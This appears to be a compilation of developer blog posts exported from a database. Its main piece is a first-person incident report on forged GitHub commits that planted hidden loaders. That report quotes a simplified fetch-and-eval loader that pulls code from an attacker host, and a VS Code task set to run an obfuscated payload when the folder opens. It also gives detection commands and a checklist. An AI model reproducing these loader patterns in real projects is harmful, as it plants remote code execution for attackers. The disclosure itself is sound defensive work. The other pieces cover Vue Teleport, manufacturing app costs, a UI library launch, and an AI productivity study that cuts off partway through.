articles.description: TL;DR   Someone with a stolen GitHub token force-pushed fake copies of my latest commits to 22 repos...
articles.body_html:
TL;DR

  • Someone with a stolen GitHub token force-pushed fake copies of my latest commits to 22 repos and 42 branches. Same message, same author name, same date.
  • Every fake commit added a hidden loader. It runs when you start the dev server, when CI builds the project, or when you just open the folder in VS Code or Cursor.
  • The giveaway was the committer timezone. My commits say +0100. The fakes said -0800 or -0700.
  • I had no personal access tokens and no SSH keys on GitHub. The likely way in was an OAuth token saved by a git or editor tool, and those tokens skip your password and your 2FA.
  • There's a checklist and some copy-paste commands at the bottom. Run them on your own repos.

A failing build saved me

It started with a Netlify deploy for a small invoice app. The build failed with this:

ERR_PNPM_OUTDATED_LOCKFILE

I opened package.json and found two dependencies I had never added:

"dotenv": "^8.2.0",
"node-fetch": "^3.3.2"

The usual fix for that error is to regenerate the lockfile and push again. I've done it a hundred times. If I had done it this time, Netlify would have installed those packages and run the malware inside my build.

The broken build was the only thing protecting me. So here's the first lesson, before the story even gets going. If a lockfile error points at a dependency you don't recognize, stop. You're not looking at a build problem anymore.

My commits, except they weren't

On GitHub, the latest commit on that repo looked like mine. My commit message, my name, my date. GitHub's security log even listed the push as coming from my own account.

The SHA didn't match the commit on my machine, though. When I looked at the raw commit data, the committer timezone was -0800 or -0700. I'm in Lagos. My commits are +0100.

Git stores two identities on every commit: the author and the committer. The attacker copied my author name, email and date exactly. The committer timestamp came from their own setup, and that's what gave them away. GitHub's UI shows you the author by default, so at a glance it all looked normal.

Once I knew what to look for, it was everywhere:

  • 22 repos and 42 branches ended up with forged commits, plus 4 more branches carrying an older variant I found later.
  • The pushes came in waves. One around 2026-10-22 at 03:58 UTC, another around 2026-11-05 at 08:00 UTC. Each wave pushed to roughly 30 repos in about two minutes. No human does that by hand. It was a script.

What the fake commits added

Every forged commit planted a loader. The details varied from repo to repo, but these were the pieces.

A file called init. It sat at the repo root and inside monorepo packages. The first 30 lines are a boring script that creates a .tmp folder. The real code is obfuscated JavaScript sitting after about 13,000 spaces on the last line. Your editor and your diff viewer show nothing unusual unless you scroll very far to the right. The older wave used a file called api.js with the same trick.

Rewritten package.json scripts. These are examples from different repos:

"dev": "node init && next dev",
"build": "node init && vite build"

The older wave used node api.js && instead. Every pnpm dev or pnpm build ran the loader first.

Payloads in config files. The same code, hidden after a long run of whitespace, got appended to the last line of configs that run at build time: postcss.config.mjs, astro.config.mjs, eslint.config.js, tailwind.config.js. Each one also gained a new header at the top:

import { createRequire } from 'module';
const require = createRequire(import.meta.url);

That header looks like normal ESM boilerplate, which is why it works as cover.

A remote eval in one Vite app. An async function appended to vite.config.ts did roughly this, simplified:

(async () => {
  const fetch = (await import('node-fetch')).default;
  const url = atob(process.env.AUTH_API_KEY);
  const res = await fetch(url);
  eval(await res.text());
})();

A committed .env file held AUTH_API_KEY as a base64 string. Decoded, it pointed to https://info.anondrop[.]net/.... So the actual payload wasn't even in the repo. It was downloaded at build time and run.

A VS Code task that runs when you open the folder. .vscode/tasks.json had a hidden task:

{
  "type": "shell",
  "command": "node ./public/fonts/fa-solid.lfk",
  "runOptions": { "runOn": "folderOpen" },
  "presentation": { "reveal": "never" }
}

That .lfk file is more obfuscated JavaScript pretending to be a font. Fake Font Awesome font files and a README sat next to it so the folder looked legit. Then .vscode/settings.json set "task.allowAutomaticTasks": true. With that combination, opening the project in VS Code or Cursor could run the payload. You didn't have to install or run anything. Workspace Trust blocks this in folders you haven't trusted, but most of us click "Trust" on our own repos without a second thought.

A rewritten .gitignore. It removed the rules for .env* and .vscode/*, which is how the .env and the task file got committed. It also added temp_auto_push.bat, temp_interactive_push.bat, config.bat and branch_structure.json. Those names look like leftovers from a Windows push script on the attacker's side, and some repos even got a committed branch_structure.json listing my branches.

Line ending noise. Many files were converted to Windows line endings. That turned small changes into giant diffs, and the real changes got lost in them.

Where it actually ran

  • In CI. A GitHub Actions workflow built forged commits successfully. Since the build script started with node init &&, a green build means the loader ran first. It ran in CI, in an environment that had a Convex deploy key. I rotated that key.
  • On my machine, maybe. An old local worktree had the api.js variant with node_modules already installed. If I ever ran pnpm dev in there, the payload ran locally.
  • On a new Windows workstation. More on that below.

How they got in

I had no personal access tokens and no SSH keys on my GitHub account. So the attacker almost certainly had an OAuth token. Git Credential Manager, the GitHub sign-in in VS Code or Cursor, and the GitHub CLI all store one of those on your machine. Steal it from an infected computer and you can push as that person.

My leading suspect is a new Windows workstation I had started using a few days before I found all this. I can't prove it was the source. I'm treating it as compromised anyway, and it's getting wiped.

The part that matters most: changing my password would not have stopped any of it. OAuth tokens keep working after a password change, and they don't ask for 2FA. You have to revoke them.

What I did about it

  1. Revoked every OAuth app and GitHub App authorization. I kept only Netlify, Vercel and CloudCannon. I signed out every other session, then logged the GitHub CLI back in on my trusted Mac only.
  2. Restored one repo with a force-push. I still had the real commits locally, so for that repo I pushed them back over the forgeries.
  3. Cleaned the rest with a commit on top. For every other infected branch, I added a "Remove injected malware" commit instead of rewriting history. That meant no force-pushes and no broken deployments. The cleanup worked on git objects directly. I never checked out or ran the infected code to fix it. The forged commits are still in the history, so I don't check out old commits on those branches.
  4. Had every cleanup reviewed. A separate AI agent checked all 42 cleanup commits, including whether each lockfile still installed. Its first pass caught real mistakes, like .gitignore rules I had missed and legitimate long lines in Markdown tables that got trimmed by accident. The second pass cleared all 42.
  5. Rotated the CI deploy key and deleted the old one.

One side lesson. Two builds failed right after the cleanup, and I immediately assumed the attack had broken something else. It hadn't. Google Fonts was briefly serving font URLs that next/font/google couldn't parse. When you're in incident mode, everything looks like the incident. Read the actual log.

What I set up so it can't happen quietly again

None of this needs GitHub Pro. Branch protection would block force-pushes, but on private repos it's a paid feature, so I put this together instead.

Signed commits plus vigilant mode. I created an SSH key just for signing and turned it on globally:

git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519_signing.pub
git config --global commit.gpgsign true

Then I added the key on GitHub as a signing key and turned on "Flag unsigned commits as unverified" in the SSH and GPG keys settings. Any new commit that isn't signed with my key, forged or not, now shows an Unverified badge.

Fast-forward-only pulls.

git config --global pull.ff only

If someone rewrites a remote branch, git pull now fails loudly instead of quietly merging their history into mine.

No automatic tasks in the editor. In both VS Code and Cursor user settings:

"task.allowAutomaticTasks": "off"

A watchdog script. I wrote a small tool called repo-guard. launchd runs it every 30 minutes. It uses the GitHub GraphQL API to list every branch of every repo I own and sends a macOS notification in two cases. The first is when a branch's history gets rewritten, meaning the old head is no longer an ancestor of the new one. The second is when a branch head contains loader files or payload markers. It also has a scan <dir> mode that I run before installing or building any project.

Rules for my AI coding assistant. I added these to its global instructions. Scan the repo before running any project command. Treat an unexpected dependency or script change as a security incident, not a build error. Never force-push, and never pull over rewritten history, without asking me first. An assistant that "helpfully" regenerates a lockfile would have done exactly what the attacker wanted.

Check your own repos

Any one of these is worth investigating:

  • A file named init, or a root api.js, that you didn't write
  • node init && or node api.js && in your package.json scripts
  • Very long lines with a big run of whitespace in config files, especially at the end of the last line
  • A new import { createRequire } from 'module' header in a config file
  • .lfk files in public/fonts
  • .vscode/tasks.json with "runOn": "folderOpen"
  • "task.allowAutomaticTasks": true in .vscode/settings.json
  • .gitignore gaining temp_auto_push.bat or config.bat, or losing its .env rules
  • node-fetch or dotenv showing up in dependencies when you didn't add them
  • Commits on GitHub with your name but a committer timezone you don't use
  • (forced update) in git fetch output on a branch you never force-pushed

Some commands to run inside a repo. None of them run project code. The forgeries live on the remote, so these check every remote branch, not just your checkout:

# Fetch first and look for "(forced update)" in the output
git fetch --all

# Already fetched before? Look for forced updates in the reflog instead
git reflog show origin/main | grep -i forced

# Every remote branch
REFS=$(git for-each-ref --format='%(refname:short)' refs/remotes/origin)

# Files that shouldn't be there
for r in $REFS; do
  git ls-tree -r --name-only "$r" | grep -E '(^|/)(init|api\.js|branch_structure\.json)$|\.lfk$' | sed "s|^|$r: |"
done

# Loader calls in package.json scripts
git grep -nE 'node (init|api\.js) &&' $REFS -- '*package.json'

# Code hiding after a long run of spaces
git grep -nE ' {50,}[^ ]' $REFS -- '*.js' '*.mjs' '*.cjs' '*.ts'

# Author date vs committer date, with timezones, across all branches
git log --all -30 --format='%h  author %ai  committer %ci  %s'

If you find something, don't install, build or open the project in your editor. Revoke your GitHub authorizations first. Go to Settings, then Applications, and clear out both Authorized OAuth Apps and Authorized GitHub Apps. Then clean up.

Last thing

I build client sites and my own products. Losing a few days to cleanup was annoying. Shipping a payload to a client's production build would have been much worse.

What protected me was a lockfile error I almost "fixed". So the next time a build fails in a way that doesn't make sense, read the diff before you read the error. And go check your committer timezones.

articles.title: Vue Teleport defer: The Target-Timing Bug Behind a Dozen Patches
articles.description: Vue's Teleport defer prop took a dozen follow-up fixes after 3.5 — the target-timing bug, the Suspense interaction, plus a copy-paste cheat sheet.
articles.body_html:
You add a <Teleport to="#modal-root"> to a component, the modal works perfectly in your dev sandbox, and then it silently fails to render the first time it's mounted inside a real page layout — no error in your code, just a console warning about a target that "doesn't exist," even though you can see the element sitting right there in the DOM inspector. The target exists. It just didn't exist yet, at the one moment Vue checked for it.

What You'll Learn

By the end of this article you'll be able to:

  • Explain exactly when Vue resolves a <Teleport> target, and why that timing — not the target's existence — is the actual bug surface
  • Use the defer prop correctly, and name the one case it does not fix
  • Read the real changelog history behind defer: a dozen-plus follow-up patches across Suspense, SSR, and disabled-state handling, the newest landing in the current stable release
  • Reproduce the classic "target renders after the Teleport" failure and fix it live
  • Apply the right defensive pattern so your own Teleport usage doesn't depend on component mount order

Who This Is For

You've used <Teleport> to render a modal, a tooltip, or a toast into a fixed DOM location and it has mostly just worked. This article assumes that baseline. If component mount timing in general — when the DOM actually exists relative to a component's lifecycle — is still fuzzy, Vue nextTick: How DOM Updates Are Batched covers the adjacent queue this article's timing model sits next to. Useful background, not required reading.

Table of Contents

  • The Problem: A Teleport Target That "Doesn't Exist"
  • The Mental Model: Teleport Resolves Its Target Once, Synchronously
  • Building It Up: From the Failure to defer
  • Edge Cases and Gotchas
  • Best Practices
  • FAQ
  • Cheat Sheet
  • Key Takeaways

This is written and tested against Vue 3.5.44 — the release carrying the most recent Teleport-specific fix. (npm's latest tag has since moved to 3.5.45, verified November 2026, which ships no Teleport changes, so nothing below is stale.) Vue 3.6 is still on the rc tag (3.6.0-rc.14 at the time of writing) and hasn't reached stable, so nothing here depends on it. Everything below — the defer prop, the mount-order behavior, and every patch referenced — ships in 3.5.x today.

The Problem: A Teleport Target That "Doesn't Exist"

Here's the setup almost everyone hits once: a layout component renders a modal-trigger area before it renders the container the modal is supposed to teleport into.

<!-- AppShell.vue -->
<template>
  <Header />
  <ModalTrigger />
  <!-- the teleport target is defined further down the tree -->
  <div id="modal-root"></div>
</template>

<!-- ModalTrigger.vue -->
<template>
  <button @click="open = true">Open modal</button>
  <Teleport to="#modal-root">
    <div v-if="open" class="modal">Hello from a teleported modal</div>
  </Teleport>
</template>

<script setup>
import { ref } from 'vue'
const open = ref(false)
</script>

This looks completely reasonable, and in a plain top-to-bottom static template like the one above it actually works, because Vue builds the whole DOM tree — #modal-root included — before anything is "open." But swap <div id="modal-root"> for something that only exists once a sibling component finishes its own async setup, or move ModalTrigger into a component that mounts earlier than the one defining #modal-root (a common shape with portals, layout slots, or anything behind v-if), and you get this in the console the moment ModalTrigger mounts:

[Vue warn]: Failed to locate Teleport target with selector "#modal-root". Note the target
element must exist before the component is mounted - i.e. the target cannot be rendered by
the component itself, and ideally should be outside of the entire Vue component tree.
[Vue warn]: Invalid Teleport target on mount: null (object)

Nothing renders. Not an error that stops your app — a warning, and the teleported content just silently doesn't appear. If you've ever debugged "the modal content is in my Vue Devtools component tree but not in the actual DOM," this is almost always why: Vue looked for the target, didn't find it yet, and gave up.

The Mental Model: Teleport Resolves Its Target Once, Synchronously

Here's the detail that explains both the bug and the fix: <Teleport> doesn't continuously watch for its target to appear. It resolves the target selector to a real DOM node exactly once, at a specific point in its own mount process, and if that lookup fails, it doesn't retry on its own.

The mental model: every component in your tree mounts in a fixed order — roughly, a parent sets up, then its children mount in template order, then the parent's own mount finishes. A <Teleport> is just one more thing that mounts at its position in that order. When ModalTrigger mounts, Vue runs querySelector('#modal-root') right then, synchronously, as part of mounting the Teleport. If #modal-root is a sibling that comes later in AppShell's template, it may not exist in the DOM yet at that exact instant — AppShell is still partway through mounting its own children. The failure isn't about whether the target element exists in your app at all; it's about whether it exists in the DOM at the single moment Vue checks.

This is also why the fix Vue shipped for this — the defer prop, added in 3.5 — is described in the official docs as working "similarly to the mounted lifecycle hook." A normal Teleport resolves its target during the synchronous mount pass, before any component's mounted hook has run. A deferred Teleport delays that same lookup until after the current render cycle — until the rest of the tree being mounted in this pass has had its chance to exist in the DOM, much like code in mounted() runs after the whole subtree is attached.

Building It Up: From the Failure to defer

Stage 1 — the target exists, but too late. This is the exact shape from the problem section:

<Teleport to="#modal-root">
  <div v-if="open" class="modal">Hello</div>
</Teleport>
<!-- #modal-root is defined in a sibling that mounts AFTER this one -->

Without any extra prop, Vue resolves #modal-root synchronously, right now, as part of mounting this Teleport. If the sibling that defines #modal-root hasn't mounted yet, the lookup fails and you get the warning from the problem section. Key concept: the content you're teleporting (open) being falsy doesn't matter — the target lookup happens at mount time regardless of whether anything is currently being teleported.

Stage 2 — add defer. This is the fix, available since Vue 3.5:

<Teleport defer to="#modal-root">
  <div v-if="open" class="modal">Hello</div>
</Teleport>

With defer, Vue doesn't give up on the first failed lookup. It waits until the current render cycle finishes — after every sibling in this same mount pass has had a chance to render — and tries the selector again. In the AppShell example, by the time that second lookup runs, #modal-root exists, because AppShell's full template has finished mounting. Key concept: defer doesn't make Teleport reactive to the target appearing at any future point — it buys exactly one extra chance, timed to land after the surrounding tree's initial mount.

Stage 3 — why that one extra chance needed its own bug-fix history. defer sounds like it should have been a clean, one-PR feature: delay a lookup, try again. In practice, "after the current render cycle" interacts with nearly every other thing Vue schedules around mounting, and getting it right took far more than one pass. Reading straight through the vuejs/core changelog for Teleport-related fixes since defer shipped:

Version Fixes
3.5.12 A disabled Teleport combined with updateCssVars (#12113)
3.5.13 Deferred Teleport updates arriving before mounted (#12168)
3.5.15 Deferred Teleport updates arriving both before and after mount (#13350)
3.5.21 Hydrating a disabled Teleport with an undefined target (#11235)
3.5.22 Multiple Teleports mounting correctly inside a custom element with shadowRoot: false (#13900)
3.5.28 Handling of the disabled Teleport's target anchor (#14417)
3.5.31 Deferring Teleport mount/update until Suspense resolves (#8619)
3.5.32 Teleport updates that arrive before its own deferred mount completes (#14642)
3.5.33 Stop moving a Teleport's children when the Teleport itself isn't mounted (#14702)
3.5.39 Nested async Teleport content resolving correctly under SSR (#9431)
3.5.44 Child-node ordering around targetStart/targetAnchor (#15818)

Eleven patches, across more than a year of 3.5.x point releases, and the most recent one landed in the version this article verifies against. Key concept: this isn't a sign that defer is fragile or that you should avoid it — it's a sign of how many real, independent timing paths a single "try again later" feature has to account for: Suspense boundaries that resolve asynchronously, SSR hydration reconciling server-rendered markup against a client mount, disabled Teleports that have no target to resolve at all, and nested component trees unmounting mid-flight. Each row above is a real, reproducible scenario someone hit in production and filed. The practical upshot: defer genuinely fixes the ordering problem from Stage 1, and by 3.5.44 the surrounding edge cases around it are, as far as the project's own issue tracker shows, settled — but it took iterating against real usage, not a single clean implementation, to get there.

Edge Cases and Gotchas

  • defer only works within the same mount/update cycle. It is not a poll, a MutationObserver, or a retry-forever mechanism. If the target element is added a tick later — inside a setTimeout, after an unrelated async operation, or from code outside Vue entirely — defer will not find it, and you get the exact same "Invalid Teleport target" warning as without defer. The fix is for ordering within one render, not for a target that doesn't exist yet at all.
  • defer plus Suspense needed a dedicated fix. If your Teleport sits inside a component wrapped in <Suspense>, the mount/update itself has to wait for the async dependency to resolve before defer's "try again" logic even makes sense — that's specifically what 3.5.31 (PR #8619) addressed. If you're on an older 3.5.x patch and see a deferred Teleport inside Suspense behave inconsistently, upgrading is the first thing to try before debugging your own code.
  • A :disabled Teleport still needs a valid target expression, even if it never activates. Several of the patches above (3.5.12, 3.5.21, 3.5.28) are specifically about the disabled state interacting badly with target resolution or hydration. Don't assume disabled sidesteps target-lookup bugs entirely; test the disabled path too if your Teleport toggles disabled dynamically.
  • Multiple Teleports targeting the same element render in mount order, not template order. If two different components each teleport into #modal-root, whichever one mounts first lands first in the DOM. This isn't something defer changes — it's an orthogonal fact worth knowing if you ever stack more than one Teleport onto a shared container and the visual order looks unexpected.
  • SSR has its own resolution path, not the same as client-side mount. The 3.5.39 fix (PR #9431) was specifically about nested async Teleport content during server rendering — a separate code path from the browser's synchronous querySelector lookup described in the mental model above. If you're teleporting content from a component that's itself inside an async <Suspense> boundary during SSR, verify on 3.5.39 or later.

Best Practices

  • Default to defer whenever the target might be a sibling rendered later in the same tree, or whenever you're not in full control of render order (layout slots, portals provided by a parent, conditionally-mounted containers). It costs nothing when the target already exists early, and it's the documented fix for exactly this failure mode.
  • Don't reach for defer as a substitute for guaranteeing the target exists. If the container element is itself behind an async condition that might resolve after the current mount pass — a fetched layout, a lazily-loaded route — defer won't help. Either hoist the target markup above the async boundary, or hold off rendering the Teleport (v-if) until you know the target is present.
  • Stay on a recent 3.5.x patch. Given how many of the fixes above are genuinely separate scenarios rather than regressions of each other, an old 3.5.x pin (anything before .39, in particular) is leaving real, already-fixed Teleport bugs on the table for no reason.
  • Test the :disabled toggle path explicitly, not just the "always enabled" happy path, if your Teleport's disabled prop is ever reactive. That's where several of the subtler fixes above lived.

FAQ

Does defer fix every "Teleport target not found" warning?

No. It fixes the specific case where the target exists somewhere in the tree being mounted in the same render pass, just later than the Teleport itself. If the target is added by unrelated code after that pass completes — a later setTimeout, a separate async fetch that isn't part of the same mount — defer still fails the same way a non-deferred Teleport would.

What Vue version added defer?

Vue 3.5. It's documented in the Teleport guide and the built-in components API reference as a 3.5+ feature.

Why did a feature this small need a dozen follow-up patches?

Because "retry the target lookup once, later" touches nearly every other thing Vue schedules around mounting: Suspense resolution, SSR hydration, the disabled state, nested unmounts, and multi-Teleport ordering inside shadow DOM. Each patch in the table above fixed one specific, independently-reported interaction — not the same bug reappearing.

Is Vue 3.6 going to change how Teleport resolves its target?

Nothing in the public 3.6 release-candidate notes changes Teleport's resolution model as of this writing (3.6.0-rc.14). This article covers 3.5.x behavior, which is what every published 3.6 pre-release so far still runs for this feature.

Should I just wrap every Teleport in defer by default?

It's a reasonable default for any Teleport whose target isn't guaranteed to exist before the Teleport itself mounts, and the cost of adding it when it isn't strictly needed is effectively zero. It is not, however, a reason to stop thinking about where the target actually lives.

Does defer interact with batching the way watch or computed do?

No — defer's one-time retry is a mount/render-cycle concern specific to Teleport's target resolution, not the shared reactivity notify buffer that ref, computed, and watch all queue through. If that separate mechanism is unfamiliar, Vue's reactivity batch and flush() loop covers it — useful context, not required here.

Cheat Sheet

Situation What to do
Target is a static element always present before the Teleport mounts No defer needed
Target is a sibling that renders later in the same mount pass Add defer
Target may not exist until an unrelated async event later defer won't help — gate the Teleport with v-if instead
Teleport is inside <Suspense> Needs 3.5.31+ for correct defer interaction
Teleport ever toggles :disabled Verify on 3.5.28+ for correct anchor handling
Teleporting during SSR with nested async content Needs 3.5.39+
Multiple Teleports share one target They render in mount order, not template order 
<!-- The safe default when you're not 100% sure the target exists yet -->
<Teleport defer to="#modal-root">
  <div v-if="open" class="modal">…</div>
</Teleport>

🎮 Try it yourself

▶️ Open the interactive playground →

Runs right in your browser — poke at it and watch the concept react live.

Key Takeaways

  • <Teleport> resolves its target selector exactly once, synchronously, at mount time — it does not watch for the target to appear later.
  • The classic failure is a target that's a sibling rendered after the Teleport in the same component tree; defer (Vue 3.5+) fixes this by retrying the lookup once, after the current render cycle, similar in timing to the mounted hook.
  • defer is not a general "wait until the target exists" mechanism — it only covers the same mount/update cycle, not a target added later by unrelated code.
  • Getting defer right across Suspense, SSR, the disabled state, and multi-Teleport ordering took more than a dozen separate patches through 3.5.x, the most recent in 3.5.44 — treat an old 3.5 pin as leaving real fixes unclaimed.
  • Multiple Teleports sharing one target land in mount order, not template order — an orthogonal fact worth knowing even when defer isn't in play.

🧠 Test yourself

Think it clicked? Take the 8-question quiz →

Instant feedback, a hint on every question, and an explanation for each answer — right or wrong.

A target that exists in your app and a target that exists in the DOM at the exact moment Vue looks for it are two different claims — defer closes the gap between them for one common case, not for all of them. The next time a Teleport "just doesn't show up," check mount order before you check your own code.

Have you hit the "Invalid Teleport target" warning in a layout you were sure was correct? Drop what finally fixed it in the comments.

articles.body_html:
Unpopular take: Wisconsin's $6.6 million investment in AI and advanced manufacturing training won't fix poorly integrated factory software.

The real budget risk isn't the app interface. It's what happens when ERP records, production equipment, and mobile workflows stop agreeing.

Wisconsin Manufacturing App Costs: 7 Hidden Integration Expenses

What makes manufacturing applications expensive?

Manufacturing app costs increase when software must connect ERP/MES platforms, legacy machines, inconsistent production data, offline devices, security controls, and external trading partners. These integrations require additional engineering, testing, infrastructure, and maintenance. Wisconsin manufacturers should estimate each connection separately rather than treating integration as a minor feature within a fixed development quote.

Here are seven expenses worth investigating before approving your software budget.

1. ERP and MES Integration: The Data Mapping Trap

Connecting a manufacturing app to Epicor, Plex, SAP, or NetSuite involves more than API authentication.

Work orders, inventory quantities, production statuses, and bills of materials (BOMs) must remain consistent across systems.

Hidden expenses include:

  • Custom API adapters and middleware.
  • Bidirectional synchronization and error recovery.
  • Field mapping and API contract testing.
  • Licensing or vendor API-access fees.

Developer checkpoint: What happens when the MES reports completed production but the ERP rejects the transaction?

Define reconciliation and retry behavior before development begins.

2. Legacy PLC and SCADA Connectivity

Older Wisconsin production facilities may operate equipment that wasn't designed for modern cloud applications.

Connecting programmable logic controllers (PLCs) and supervisory control and data acquisition (SCADA) systems can require protocol adapters, industrial gateways, and specialized testing.

The OPC Foundation provides interoperability standards, but older equipment may still require custom integration.

Cost control: Inventory machine models, firmware, protocols, and available interfaces before estimating development.

3. Data Migration and Production Record Reconciliation

Poor master data can turn a straightforward application into an expensive cleanup project.

Common manufacturing data problems include duplicate part numbers, inconsistent measurement units, outdated BOM revisions, and missing lot histories.

These affect inventory accuracy, traceability, and production reporting.

Invest in validation rules, migration tests, and reconciliation reports before connecting live systems.

Specialized data engineering services can help establish consistent data pipelines and reliable records across manufacturing applications.

4. Offline Synchronization and Conflict Resolution

Factory Wi-Fi isn't always reliable. Applications used on production floors must often continue working without connectivity.

That requires local storage, secure synchronization, duplicate prevention, and conflict-handling rules.

For example, a production event shouldn't be recorded twice when a tablet retries a failed request.

INSERT INTO machine_events(event_id, payload)
VALUES (:event_id, :payload)
ON CONFLICT (event_id) DO NOTHING;

What developers should test

  • Duplicate submissions after reconnecting.
  • Out-of-order production events.
  • Conflicting edits from multiple operators.
  • Interrupted synchronization and recovery.

The hidden expense: Offline support changes backend design, testing, and operational monitoring, not just the mobile interface.

5. Industrial Cybersecurity and Access Controls

Manufacturing apps frequently connect operational technology (OT) networks with enterprise IT systems.

That connection expands the security requirements.

Budget for:

  • Network segmentation and firewall configuration.
  • Role-based access and identity management.
  • Audit logs and secure data transmission.
  • Security testing and incident recovery.

NIST SP 800-82 Rev. 3 provides established guidance for securing operational technology while maintaining system reliability and safety.

Avoid direct, unrestricted connections between public applications and production controllers.

6. EDI and Supply Chain Partner Integrations

Electronic data interchange (EDI) connections can introduce expenses beyond the initial API development.

Manufacturers may need to support purchase orders, advance shipping notices, invoices, and supplier-specific formats.

Each trading partner can require separate mapping, certification, monitoring, and ongoing updates.

This is where disciplined product engineering services help keep integration components independently testable and maintainable.

Ask before signing: Does the proposal include onboarding every required trading partner or just the first connector?

7. Production Testing, Cutover, and Continuous Support

An app that passes staging tests can still fail during a live production shift.

Manufacturing deployments require realistic production scenarios, operator training, rollback procedures, and coordination around planned downtime.

Ongoing expenses include monitoring, API changes, firmware compatibility, and security updates.

Quokka Labs' 4-stage legacy modernization strategy emphasizes dependency discovery, regression testing, data reconciliation, and controlled cutover.

These activities should appear as explicit deliverables in the proposal.

How Much Do Manufacturing App Integrations Cost in Wisconsin?

Consider a hypothetical single-plant project requiring seven integration workstreams.

Assume a blended engineering rate of $125/hour.

Integration expense Estimated hours Modeled cost
ERP/MES integration 120 $15,000
PLC/SCADA connectivity 160 $20,000
Data migration 100 $12,500
Offline synchronization 120 $15,000
OT security engineering 80 $10,000
EDI integration 80 $10,000
Testing and cutover 100 $12,500
Total integration 760 $95,000

Illustrative planning scenario, not Quokka Labs' historical project pricing or a Wisconsin market average. Actual estimates depend on equipment, scope, rates, and infrastructure.

What Does the Complete Project Budget Look Like?

A manufacturing app quoted at $90,000 could reach $212,750 under this scenario. Adding $95,000 in integration work produces a $185,000 project subtotal. A 15% contingency adds $27,750. This excludes hardware, software licenses, cloud operations, and ongoing support, which require separate estimates before procurement approval.

The lesson: Compare total implementation costs, not just development quotes.

How Can Wisconsin Manufacturers Reduce Integration Costs?

The most effective approach is to reduce uncertainty before committing to a complete build.

Five checks before approving the budget

  1. Inventory every ERP, MES, PLC, and third-party interface.
  2. Confirm API access, ownership, and licensing restrictions.
  3. Test one end-to-end production workflow.
  4. Require measurable synchronization and recovery tests.
  5. Separate initial implementation from recurring operating costs.

For Wisconsin manufacturers, Quokka Labs provides mobile app development services in Wisconsin focused on connecting mobile experiences with dependable enterprise systems.

Why Consider Quokka Labs?

Quokka Labs brings 15+ years of engineering experience across digital products, application modernization, data systems, and AI-native development.

Its approach prioritizes architecture, secure integration, testing, and operational reliability, not simply delivering an app interface.

Through application modernization services, teams can evaluate whether existing systems should be integrated, refactored, or replaced before investing in a larger rebuild.

For manufacturers considering AI, the same principle applies: reliable production data must come before predictive analytics or intelligent automation.

FAQs

Can AI Reduce Manufacturing App Integration Costs?

AI can assist with schema analysis, API documentation, code generation, test creation, and legacy dependency discovery. However, it cannot independently establish whether production records are correct or whether a machine connection is safe. Engineers must validate data mappings, security boundaries, failure recovery, and deployment behavior before AI-assisted integrations enter production.

Should Manufacturers Replace Their Existing ERP?

Not automatically. Replacing an ERP can introduce migration risks, operational disruption, and additional licensing costs. A targeted integration layer may be more economical when the existing system remains reliable. Consider replacement when unsupported software, limited interfaces, recurring failures, or maintenance costs make continued integration impractical.

Final Takeaway: Budget for the Factory, Not Just the App

articles.body_html:
We've never had so much power to build software. You can turn an idea into a working app in a day/hour/minute? But there's always a catch: You AI agent can solve it too. So the question is: does anyone actually need what we/you/me're building?

I've been working in product development, open source, and startups for years, and this question has never felt more closer to home.

Every day we see more and more apps, but it's not always clear who the end user is or what problem it's going solving.

We've been working on our data grid library, RevoGrid, for quite a few years now (closer to decade if we count for Open Source part). It's an Excel-like data grid you can put into your app.

Over this time, we've built so many components and tried so many approaches that you could probably build an entire Power BI on top of it. We've spent even more time testing it and solving quests of "what to do next?"

So recently, we spent a week of our lives extracting these components into a separate UI library and making it available to everyone.

What's inside? Pretty much the building blocks we've needed for our own products: charts, AI chat interfaces, file viewers, date pickers, dropdowns, forms, time grids, timeline controls, and plenty of smaller UI components.

Basically, the stuff you need when building analytical dashboards, reporting tools, or project management apps. And it works with React, Vue, Angular, Svelte, and plain TypeScript.

We use it a lot ourselves. Pretty much all our interfaces are built with these components.

Not sure if the world needs another UI library, but here it is. It's simple, it's been tested in our own products, and maybe it'll find a place in yours too, especially if you don't want to do all the heavy lifting yourself.

Happy coding! (Or is it vibe coding now?)

articles.title: Developers Swear AI Makes Them Faster. A Stopwatch Says They're 19% Slower
articles.description: There are two completely different AIs — the one you're forced to use and the one an expert chose — and we keep confusing them. Five measured findings, the methodology behind each, and the one mechanism that explains all of it.
articles.body_html:
Ask a senior engineer whether they could do their job without AI and you'll often get a contradiction that shouldn't be possible: "I'd be slower… but honestly, happier."

Slower and happier. Those don't go together — unless the thing speeding you up is also quietly costing you something the speed doesn't show. That one sentence is the entire AI debate compressed, and once you pull it apart with actual studies, a clean line appears. Everything that follows is on one side of it or the other.

Here's the line, then five findings with the methodology attached, then the single mechanism underneath all of them.

There are two AIs, and we keep confusing them

Not two models — two situations. The same LLM behaves like a different product depending on who is holding it and whether they can check its work.

The AI you're forced to use The AI someone chose
Who selects it A search engine, an employer, a PM A domain expert who already knows the answer's shape
Typical job Search summary, chatbot, "write my email" Crunch 100k log lines, triage a dataset, flag edge cases
Can the receiver verify it? No — you asked because you didn't know Yes — the expert catches the mistakes
Cost of a wrong answer You act on it and lose Caught in review; no harm
Who absorbs the error The least-equipped person in the chain The most-equipped person in the chain
Net result Usually a hidden tax Genuinely useful

Every "AI changed my work" story lives in the right column. Every "AI wasted my afternoon" story lives in the left. Same technology, opposite outcome — and the only variable that actually moved is whether the person receiving the output can tell when it's lying.

Now the receipts, each with the study design attached, because "a study found" is exactly the kind of ungrounded claim this article is about.

Fact 1 — "Faster" is, for experienced people, measurably backwards

The study: In 2025, METR ran the test everyone assumed had already been done — a randomized controlled trial of AI's effect on real work, not a survey. 16 experienced open-source developers. 246 genuine tasks drawn from their own large repositories (repos they knew cold, averaging 1M+ lines, 22k+ stars). Each task was randomly assigned "AI allowed" or "AI forbidden." Most used Cursor Pro with Claude 3.5/3.7 Sonnet — current, capable tooling.

The headline:

Developer speed WITH AI tools — METR 2025 RCT
Predicted beforehand   +24%   ▲ faster     (what they expected)
Felt afterward         +20%   ▲ faster     (what they believed even after)
Actually measured      −19%   ▼ SLOWER     (what the clock said)

They were 19% slower with AI — while remaining convinced it had sped them up by 20%. Think about the size of that gap: a 39-point swing between perception and reality, after they'd finished the work.

The micro-breakdown — where the time actually went (this is the part the headlines skip):

Activity What happened with AI allowed
Writing code by hand ↓ went down
Searching / reading docs ↓ went down
Prompting the model ↑ new time sink
Waiting on generations ↑ new time sink
Reviewing + cleaning output ↑ ~9% of total task time
Idle ↑ went up

